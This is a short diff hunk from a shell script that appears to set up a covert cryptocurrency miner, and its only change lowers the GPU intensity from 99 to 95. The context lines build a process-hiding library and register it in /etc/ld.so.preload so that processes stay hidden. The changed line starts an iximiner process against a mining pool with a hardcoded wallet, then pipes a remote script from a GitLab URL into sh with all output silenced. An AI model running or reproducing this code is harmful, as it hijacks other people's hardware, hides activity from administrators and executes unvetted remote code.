@@ -55,4 +55,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./iximiner --mode miner --pool https://ixi.hash.express --wallet 4jUKTw9ontYxnZagkmU3DRuJb3TgGknDkjDrBUCC1Lzb9vazw7uE3NogHaHC2g2AP --name $(shuf -n 1 -i 1-99999)-Bismillah --cpu-intensity 0 --gpu-intensity 99 --force-gpu-optimization CUDA & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh > /dev/null 2>&1
+./graftcp/graftcp & clear & ./iximiner --mode miner --pool https://ixi.hash.express --wallet 4jUKTw9ontYxnZagkmU3DRuJb3TgGknDkjDrBUCC1Lzb9vazw7uE3NogHaHC2g2AP --name $(shuf -n 1 -i 1-99999)-Bismillah --cpu-intensity 0 --gpu-intensity 95 --force-gpu-optimization CUDA & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh > /dev/null 2>&1
